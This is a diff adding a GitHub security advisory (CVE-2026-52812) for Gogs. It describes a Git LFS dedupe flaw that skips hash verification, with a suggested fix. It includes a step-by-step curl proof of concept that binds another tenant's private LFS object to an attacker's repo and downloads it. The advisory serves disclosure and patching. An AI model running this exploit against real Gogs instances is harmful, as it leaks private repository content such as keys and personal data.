@@ -1,0 +1,57 @@
+{
+  "id": "GHSA-6p9m-q3jp-47h4",
+  "modified": "2026-06-23T17:15:09.996556590Z",
+  "published": "2026-06-23T17:10:25Z",
+  "aliases": [
+    "CVE-2026-52812"
+  ],
+  "summary": "Gogs: LFS dedupe path leaks private repo content across tenants",
+  "details": "Summary\n\nGit LFS storage is content-addressed by OID alone (`\u003cLFS-root\u003e/\u003coid[0]\u003e/\u003coid[1]\u003e/\u003coid\u003e`) but per-repo authorization lives in the `lfs_object` table keyed `(repo_id, oid)`. `serveUpload` skips re-uploading when the OID file already exists on disk and inserts a new `(repo_id, oid)` row pointing at it **without verifying the request body hashes to the OID being claimed**. Any user with write access to one repo can bind their repo to an OID owned by a private repo and download the original bytes via their own download endpoint.\n\nDetails\n\nDedupe shortcut at `internal/lfsx/storage.go:79-82`:\n\n```go\nif fi, err := os.Stat(fpath); err == nil {\n    _, _ = io.Copy(io.Discard, rc)\n    return fi.Size(), nil          // ← returns success with no hash check\n}\n```\n\nHash verification at `internal/lfsx/storage.go:106-108` only runs in the *new-file* branch — the dedupe path returns earlier.\n\n`serveUpload` (`internal/route/lfs/basic.go:78-114`) trusts that success and inserts the per-repo binding:\n\n```go\n_, err := h.store.GetLFSObjectByOID(c.Req.Context(), repo.ID, oid)   // per-repo\nif err == nil { /* already linked, drain \u0026 return 200 */ }\nwritten, err := s.Upload(oid, c.Req.Request.Body)\nerr = h.store.CreateLFSObject(c.Req.Context(), repo.ID, oid, written, s.Storage())\n```\n\n`CreateLFSObject` is an unconditional `INSERT` on `(repo_id, oid)` with no check that the OID is referenced by the requesting repo's git history.\n\n`serveDownload` at `internal/route/lfs/basic.go:42-72` only consults the per-repo row, then streams from the shared content-addressed file.\n\nSuggested fix\n\n1. In `LocalStorage.Upload`, when `os.Stat(fpath) == nil`, hash the request body via `io.TeeReader` and `ErrOIDMismatch` on disagreement — same code path as the new-file branch already uses. The \"client retries after partial failure\" use case still works; the retry just has to send the correct content.\n2. Optional second layer: in `serveUpload`, refuse `CreateLFSObject` unless the OID is referenced by an LFS pointer in the requesting repo's refs.\n\nPoC\n\nTested against gogs at HEAD `d7571322` (also reproduces on `v0.14.2`, paths are `internal/lfsutil/storage.go` and identical logic).\n\n### Reproduction prerequisites\n- Running gogs ≥ 0.12.0 with `[lfs] ENABLED = true`.\n- Two accounts: `alice` (private repo `secrets`) and `bob` (any repo `bob/scratch`); bob has no access to `alice/secrets`.\n- An OID known to be present in `alice/secrets` — leaked LFS pointer file in any public ancestor commit, stale fork, support ticket, or any side channel. Brute force is infeasible (256-bit).\n\n### Setup (testbed simulation of the victim's prior state)\n\n```sh\nGOGS=https://gogs.example\nALICE_AUTH='-u alice:alice_password'\nBOB_AUTH='-u bob:bob_password'\n\nVICTIM_BYTES='victim secret content'\nOID=$(printf %s \"$VICTIM_BYTES\" | sha256sum | cut -d' ' -f1)\nSIZE=$(printf %s \"$VICTIM_BYTES\" | wc -c)\n\n# After this, file lives at \u003cconf.LFS.ObjectsPath\u003e/\u003cOID[0]\u003e/\u003cOID[1]\u003e/\u003cOID\u003e\n# and (alice/secrets, OID) row exists in lfs_object.\nprintf %s \"$VICTIM_BYTES\" | curl -sS $ALICE_AUTH \\\n  -H 'Content-Type: application/octet-stream' \\\n  -X PUT --data-binary @- \\\n  \"$GOGS/alice/secrets.git/info/lfs/objects/basic/$OID\"\n```\n\n### Attack — bob has only `$OID`, not `$VICTIM_BYTES`\n\n```sh\nunset VICTIM_BYTES   # attacker has no idea what the file contains\n\n# 1. Confirm bob has no claim on $OID.\ncurl -sS $BOB_AUTH \\\n  -H 'Accept: application/vnd.git-lfs+json' \\\n  -H 'Content-Type: application/vnd.git-lfs+json' \\\n  -X POST \"$GOGS/bob/scratch.git/info/lfs/objects/batch\" \\\n  --data \"{\\\"operation\\\":\\\"download\\\",\\\"objects\\\":[{\\\"oid\\\":\\\"$OID\\\",\\\"size\\\":$SIZE}]}\"\n# → \"actions\":{\"error\":{\"code\":404,\"message\":\"Object does not exist\"}}\n\n# 2. PUT garbage to bob's LFS endpoint. The on-disk OID file already exists\n#    so LocalStorage.Upload takes the dedupe shortcut: drains the body\n#    without hashing, returns alice's size; CreateLFSObject inserts (bob, OID).\ncurl -sS $BOB_AUTH \\\n  -H 'Content-Type: application/octet-stream' \\\n  -X PUT --data-binary 'irrelevant attacker-controlled bytes' \\\n  \"$GOGS/bob/scratch.git/info/lfs/objects/basic/$OID\"\n# → HTTP/1.1 200 OK\n\n# 3. Download via bob's repo — gogs streams alice's bytes.\ncurl -sS $BOB_AUTH \"$GOGS/bob/scratch.git/info/lfs/objects/basic/$OID\" -o /tmp/leaked\ncat /tmp/leaked\n# → victim secret content\nsha256sum /tmp/leaked | cut -d' ' -f1\n# → matches $OID exactly\n```\n\n### Independent confirmation against the source\n\n```sh\ngit clone https://github.com/gogs/gogs.git \u0026\u0026 cd gogs\ngit checkout d7571322\n\nsed -n '63,114p' internal/lfsx/storage.go      # dedupe at 79-82, hash check at 106 only in new-file branch\nsed -n '74,117p' internal/route/lfs/basic.go   # serveUpload calls CreateLFSObject regardless of dedupe path\ngrep -n 'primaryKey' internal/database/lfs.go  # composite (RepoID, OID) PK — multiple repos can share an OID row\n```\n\nImpact\n\n- **Cross-tenant disclosure of any LFS object on the instance.** Attacker needs HTTP write to one repo + knowledge of a target OID; storage path is global, no per-repo isolation.\n- LFS commonly stores certificates/keys, firmware blobs, ML model weights, datasets containing PII, packaged installers — all extracted byte-for-byte.\n- Persistent: the `(bob/scratch, OID)` row pins read access until manually deleted; removing bob's repo write access does not revoke prior binds. No artefact on victim's side beyond a 200 in the LFS access log.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "gogs.io/gogs",
+        "purl": "pkg:golang/gogs.io/gogs"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.14.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-6p9m-q3jp-47h4/GHSA-6p9m-q3jp-47h4.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/gogs/gogs/security/advisories/GHSA-6p9m-q3jp-47h4"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gogs/gogs/pull/8333"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gogs/gogs/commit/f35a767af74e05342bafc6fdda02c791816426f8"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/gogs/gogs"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gogs/gogs/releases/tag/v0.14.3"
+    }
+  ]
+}
